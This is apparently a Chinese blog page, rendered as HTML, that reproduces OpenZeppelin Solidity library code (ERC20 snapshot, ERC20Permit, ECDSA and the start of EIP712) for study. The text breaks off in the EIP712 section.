_updateTotalSupplySnapshot() private &#123;</span><br><span class="line">        _updateSnapshot(_totalSupplySnapshots, totalSupply());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _updateSnapshot(Snapshots storage snapshots, uint256 currentValue) private &#123;</span><br><span class="line">        uint256 currentId = _getCurrentSnapshotId();</span><br><span class="line">        <span class="keyword">if</span> (_lastSnapshotId(snapshots.ids) &lt; currentId) &#123;</span><br><span class="line">            snapshots.ids.push(currentId);</span><br><span class="line">            snapshots.values.push(currentValue);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _lastSnapshotId(uint256[] storage ids) private view <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (ids.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ids[ids.length - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ERC20Permit-sol-签名"><a href="#ERC20Permit-sol-签名" class="headerlink" title="ERC20Permit.sol(签名)"></a>ERC20Permit.sol(签名)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="comment">// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/extensions/ERC20Permit.sol)</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">import <span class="string">&quot;./IERC20Permit.sol&quot;</span>;</span><br><span class="line">import <span class="string">&quot;../ERC20.sol&quot;</span>;</span><br><span class="line">import <span class="string">&quot;../../../utils/cryptography/ECDSA.sol&quot;</span>;</span><br><span class="line">import <span class="string">&quot;../../../utils/cryptography/EIP712.sol&quot;</span>;</span><br><span class="line">import <span class="string">&quot;../../../utils/Counters.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @dev Implementation of the ERC20 Permit extension allowing approvals to be made via signatures, as defined in</span></span><br><span class="line"><span class="comment"> * https://eips.ethereum.org/EIPS/eip-2612[EIP-2612].</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Adds the &#123;permit&#125; method, which can be used to change an account&#x27;s ERC20 allowance (see &#123;IERC20-allowance&#125;) by</span></span><br><span class="line"><span class="comment"> * presenting a message signed by the account. By not relying on `&#123;IERC20-approve&#125;`, the token holder account doesn&#x27;t</span></span><br><span class="line"><span class="comment"> * need to send a transaction, and thus is not required to hold Ether at all.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * _Available since v3.4._</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">abstract contract ERC20Permit is ERC20, IERC20Permit, EIP712 &#123;</span><br><span class="line">    using Counters <span class="keyword">for</span> Counters.Counter;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; Counters.Counter) private _nonces;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// solhint-disable-next-line var-name-mixedcase</span></span><br><span class="line">    bytes32 private constant _PERMIT_TYPEHASH =</span><br><span class="line">        keccak256(<span class="string">&quot;Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)&quot;</span>);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev In previous versions `_PERMIT_TYPEHASH` was declared as `immutable`.</span></span><br><span class="line"><span class="comment">     * However, to ensure consistency with the upgradeable transpiler, we will continue</span></span><br><span class="line"><span class="comment">     * to reserve a slot.</span></span><br><span class="line"><span class="comment">     * @custom:oz-renamed-from _PERMIT_TYPEHASH</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">// solhint-disable-next-line var-name-mixedcase</span></span><br><span class="line">    bytes32 private _PERMIT_TYPEHASH_DEPRECATED_SLOT;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Initializes the &#123;EIP712&#125; domain separator using the `name` parameter, and setting `version` to `&quot;1&quot;`.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * It&#x27;s a good idea to use the same `name` that is defined as the ERC20 token name.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    constructor(<span class="built_in">string</span> memory name) EIP712(name, <span class="string">&quot;1&quot;</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev See &#123;IERC20Permit-permit&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">permit</span><span class="params">(</span></span><br><span class="line"><span class="params">        address owner,</span></span><br><span class="line"><span class="params">        address spender,</span></span><br><span class="line"><span class="params">        uint256 value,</span></span><br><span class="line"><span class="params">        uint256 deadline,</span></span><br><span class="line"><span class="params">        uint8 v,</span></span><br><span class="line"><span class="params">        bytes32 r,</span></span><br><span class="line"><span class="params">        bytes32 s</span></span><br><span class="line"><span class="params">    )</span> public virtual override &#123;</span><br><span class="line">        require(block.timestamp &lt;= deadline, <span class="string">&quot;ERC20Permit: expired deadline&quot;</span>);</span><br><span class="line"></span><br><span class="line">        bytes32 structHash = keccak256(abi.encode(_PERMIT_TYPEHASH, owner, spender, value, _useNonce(owner), deadline));</span><br><span class="line"></span><br><span class="line">        bytes32 hash = _hashTypedDataV4(structHash);</span><br><span class="line"></span><br><span class="line">        address signer = ECDSA.recover(hash, v, r, s);</span><br><span class="line">        require(signer == owner, <span class="string">&quot;ERC20Permit: invalid signature&quot;</span>);</span><br><span class="line"></span><br><span class="line">        _approve(owner, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev See &#123;IERC20Permit-nonces&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">nonces</span><span class="params">(address owner)</span> public view virtual override <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> _nonces[owner].current();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev See &#123;IERC20Permit-DOMAIN_SEPARATOR&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">// solhint-disable-next-line func-name-mixedcase</span></span><br><span class="line">    function <span class="title function_">DOMAIN_SEPARATOR</span><span class="params">()</span> external view override <span class="title function_">returns</span> <span class="params">(bytes32)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> _domainSeparatorV4();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev &quot;Consume a nonce&quot;: return the current value and increment.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * _Available since v4.1._</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function _useNonce(address owner) internal virtual <span class="title function_">returns</span> <span class="params">(uint256 current)</span> &#123;</span><br><span class="line">        Counters.Counter storage nonce = _nonces[owner];</span><br><span class="line">        current = nonce.current();</span><br><span class="line">        nonce.increment();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ECDSA-sol（签名）"><a href="#ECDSA-sol（签名）" class="headerlink" title="ECDSA.sol（签名）"></a>ECDSA.sol（签名）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="comment">// OpenZeppelin Contracts (last updated v4.8.0) (utils/cryptography/ECDSA.sol)</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">import <span class="string">&quot;../Strings.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @dev Elliptic Curve Digital Signature Algorithm (ECDSA) operations.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * These functions can be used to verify that a message was signed by the holder</span></span><br><span class="line"><span class="comment"> * of the private keys of a given address.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">library ECDSA &#123;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">RecoverError</span> &#123;</span></span><br><span class="line">        NoError,</span><br><span class="line">        InvalidSignature,</span><br><span class="line">        InvalidSignatureLength,</span><br><span class="line">        InvalidSignatureS,</span><br><span class="line">        InvalidSignatureV <span class="comment">// Deprecated in v4.8</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _throwError(RecoverError error) private pure &#123;</span><br><span class="line">        <span class="keyword">if</span> (error == RecoverError.NoError) &#123;</span><br><span class="line">            <span class="keyword">return</span>; <span class="comment">// no error: do nothing</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (error == RecoverError.InvalidSignature) &#123;</span><br><span class="line">            revert(<span class="string">&quot;ECDSA: invalid signature&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (error == RecoverError.InvalidSignatureLength) &#123;</span><br><span class="line">            revert(<span class="string">&quot;ECDSA: invalid signature length&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (error == RecoverError.InvalidSignatureS) &#123;</span><br><span class="line">            revert(<span class="string">&quot;ECDSA: invalid signature &#x27;s&#x27; value&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns the address that signed a hashed message (`hash`) with</span></span><br><span class="line"><span class="comment">     * `signature` or error string. This address can then be used for verification purposes.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The `ecrecover` EVM opcode allows for malleable (non-unique) signatures:</span></span><br><span class="line"><span class="comment">     * this function rejects them by requiring the `s` value to be in the lower</span></span><br><span class="line"><span class="comment">     * half order, and the `v` value to be either 27 or 28.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * IMPORTANT: `hash` _must_ be the result of a hash operation for the</span></span><br><span class="line"><span class="comment">     * verification to be secure: it is possible to craft signatures that</span></span><br><span class="line"><span class="comment">     * recover to arbitrary addresses for non-hashed data. A safe way to ensure</span></span><br><span class="line"><span class="comment">     * this is by receiving a hash of the original message (which may otherwise</span></span><br><span class="line"><span class="comment">     * be too long), and then calling &#123;toEthSignedMessageHash&#125; on it.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Documentation for signature generation:</span></span><br><span class="line"><span class="comment">     * - with https://web3js.readthedocs.io/en/v1.3.4/web3-eth-accounts.html#sign[Web3.js]</span></span><br><span class="line"><span class="comment">     * - with https://docs.ethers.io/v5/api/signer/#Signer-signMessage[ethers]</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * _Available since v4.3._</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">tryRecover</span><span class="params">(bytes32 hash, bytes memory signature)</span> internal pure <span class="title function_">returns</span> <span class="params">(address, RecoverError)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (signature.length == <span class="number">65</span>) &#123;</span><br><span class="line">            bytes32 r;</span><br><span class="line">            bytes32 s;</span><br><span class="line">            uint8 v;</span><br><span class="line">            <span class="comment">// ecrecover takes the signature parameters, and the only way to get them</span></span><br><span class="line">            <span class="comment">// currently is to use assembly.</span></span><br><span class="line">            <span class="comment">/// @solidity memory-safe-assembly</span></span><br><span class="line">            assembly &#123;</span><br><span class="line">                r := mload(add(signature, <span class="number">0x20</span>))</span><br><span class="line">                s := mload(add(signature, <span class="number">0x40</span>))</span><br><span class="line">                v := byte(<span class="number">0</span>, mload(add(signature, <span class="number">0x60</span>)))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> tryRecover(hash, v, r, s);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (address(<span class="number">0</span>), RecoverError.InvalidSignatureLength);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns the address that signed a hashed message (`hash`) with</span></span><br><span class="line"><span class="comment">     * `signature`. This address can then be used for verification purposes.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The `ecrecover` EVM opcode allows for malleable (non-unique) signatures:</span></span><br><span class="line"><span class="comment">     * this function rejects them by requiring the `s` value to be in the lower</span></span><br><span class="line"><span class="comment">     * half order, and the `v` value to be either 27 or 28.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * IMPORTANT: `hash` _must_ be the result of a hash operation for the</span></span><br><span class="line"><span class="comment">     * verification to be secure: it is possible to craft signatures that</span></span><br><span class="line"><span class="comment">     * recover to arbitrary addresses for non-hashed data. A safe way to ensure</span></span><br><span class="line"><span class="comment">     * this is by receiving a hash of the original message (which may otherwise</span></span><br><span class="line"><span class="comment">     * be too long), and then calling &#123;toEthSignedMessageHash&#125; on it.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">recover</span><span class="params">(bytes32 hash, bytes memory signature)</span> internal pure <span class="title function_">returns</span> <span class="params">(address)</span> &#123;</span><br><span class="line">        (address recovered, RecoverError error) = tryRecover(hash, signature);</span><br><span class="line">        _throwError(error);</span><br><span class="line">        <span class="keyword">return</span> recovered;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Overload of &#123;ECDSA-tryRecover&#125; that receives the `r` and `vs` short-signature fields separately.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * See https://eips.ethereum.org/EIPS/eip-2098[EIP-2098 short signatures]</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * _Available since v4.3._</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">tryRecover</span><span class="params">(bytes32 hash, bytes32 r, bytes32 vs)</span> internal pure <span class="title function_">returns</span> <span class="params">(address, RecoverError)</span> &#123;</span><br><span class="line">        bytes32 s = vs &amp; bytes32(<span class="number">0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span>);</span><br><span class="line">        uint8 v = uint8((uint256(vs) &gt;&gt; <span class="number">255</span>) + <span class="number">27</span>);</span><br><span class="line">        <span class="keyword">return</span> tryRecover(hash, v, r, s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Overload of &#123;ECDSA-recover&#125; that receives the `r and `vs` short-signature fields separately.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * _Available since v4.2._</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">recover</span><span class="params">(bytes32 hash, bytes32 r, bytes32 vs)</span> internal pure <span class="title function_">returns</span> <span class="params">(address)</span> &#123;</span><br><span class="line">        (address recovered, RecoverError error) = tryRecover(hash, r, vs);</span><br><span class="line">        _throwError(error);</span><br><span class="line">        <span class="keyword">return</span> recovered;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Overload of &#123;ECDSA-tryRecover&#125; that receives the `v`,</span></span><br><span class="line"><span class="comment">     * `r` and `s` signature fields separately.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * _Available since v4.3._</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">tryRecover</span><span class="params">(bytes32 hash, uint8 v, bytes32 r, bytes32 s)</span> internal pure <span class="title function_">returns</span> <span class="params">(address, RecoverError)</span> &#123;</span><br><span class="line">        <span class="comment">// EIP-2 still allows signature malleability for ecrecover(). Remove this possibility and make the signature</span></span><br><span class="line">        <span class="comment">// unique. Appendix F in the Ethereum Yellow paper (https://ethereum.github.io/yellowpaper/paper.pdf), defines</span></span><br><span class="line">        <span class="comment">// the valid range for s in (301): 0 &lt; s &lt; secp256k1n ÷ 2 + 1, and for v in (302): v ∈ &#123;27, 28&#125;. Most</span></span><br><span class="line">        <span class="comment">// signatures from current libraries generate a unique signature with an s-value in the lower half order.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// If your library generates malleable signatures, such as s-values in the upper range, calculate a new s-value</span></span><br><span class="line">        <span class="comment">// with 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - s1 and flip v from 27 to 28 or</span></span><br><span class="line">        <span class="comment">// vice versa. If your library also generates signatures with 0/1 for v instead 27/28, add 27 to v to accept</span></span><br><span class="line">        <span class="comment">// these malleable signatures as well.</span></span><br><span class="line">        <span class="keyword">if</span> (uint256(s) &gt; <span class="number">0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (address(<span class="number">0</span>), RecoverError.InvalidSignatureS);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If the signature is valid (and not malleable), return the signer address</span></span><br><span class="line">        address signer = ecrecover(hash, v, r, s);</span><br><span class="line">        <span class="keyword">if</span> (signer == address(<span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (address(<span class="number">0</span>), RecoverError.InvalidSignature);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (signer, RecoverError.NoError);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Overload of &#123;ECDSA-recover&#125; that receives the `v`,</span></span><br><span class="line"><span class="comment">     * `r` and `s` signature fields separately.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">recover</span><span class="params">(bytes32 hash, uint8 v, bytes32 r, bytes32 s)</span> internal pure <span class="title function_">returns</span> <span class="params">(address)</span> &#123;</span><br><span class="line">        (address recovered, RecoverError error) = tryRecover(hash, v, r, s);</span><br><span class="line">        _throwError(error);</span><br><span class="line">        <span class="keyword">return</span> recovered;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns an Ethereum Signed Message, created from a `hash`. This</span></span><br><span class="line"><span class="comment">     * produces hash corresponding to the one signed with the</span></span><br><span class="line"><span class="comment">     * https://eth.wiki/json-rpc/API#eth_sign[`eth_sign`]</span></span><br><span class="line"><span class="comment">     * JSON-RPC method as part of EIP-191.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * See &#123;recover&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">toEthSignedMessageHash</span><span class="params">(bytes32 hash)</span> internal pure <span class="title function_">returns</span> <span class="params">(bytes32)</span> &#123;</span><br><span class="line">        <span class="comment">// 32 is the length in bytes of hash,</span></span><br><span class="line">        <span class="comment">// enforced by the type signature above</span></span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.encodePacked(<span class="string">&quot;\x19Ethereum Signed Message:\n32&quot;</span>, hash));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns an Ethereum Signed Message, created from `s`. This</span></span><br><span class="line"><span class="comment">     * produces hash corresponding to the one signed with the</span></span><br><span class="line"><span class="comment">     * https://eth.wiki/json-rpc/API#eth_sign[`eth_sign`]</span></span><br><span class="line"><span class="comment">     * JSON-RPC method as part of EIP-191.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * See &#123;recover&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">toEthSignedMessageHash</span><span class="params">(bytes memory s)</span> internal pure <span class="title function_">returns</span> <span class="params">(bytes32)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.encodePacked(<span class="string">&quot;\x19Ethereum Signed Message:\n&quot;</span>, Strings.toString(s.length), s));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns an Ethereum Signed Typed Data, created from a</span></span><br><span class="line"><span class="comment">     * `domainSeparator` and a `structHash`. This produces hash corresponding</span></span><br><span class="line"><span class="comment">     * to the one signed with the</span></span><br><span class="line"><span class="comment">     * https://eips.ethereum.org/EIPS/eip-712[`eth_signTypedData`]</span></span><br><span class="line"><span class="comment">     * JSON-RPC method as part of EIP-712.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * See &#123;recover&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">toTypedDataHash</span><span class="params">(bytes32 domainSeparator, bytes32 structHash)</span> internal pure <span class="title function_">returns</span> <span class="params">(bytes32)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.encodePacked(<span class="string">&quot;\x19\x01&quot;</span>, domainSeparator, structHash));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="EIP712-sol（签名）"><a href="#EIP712-sol（签名）" class="headerlink" title="EIP712.sol（签名）"></a>EIP712.sol（签名）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 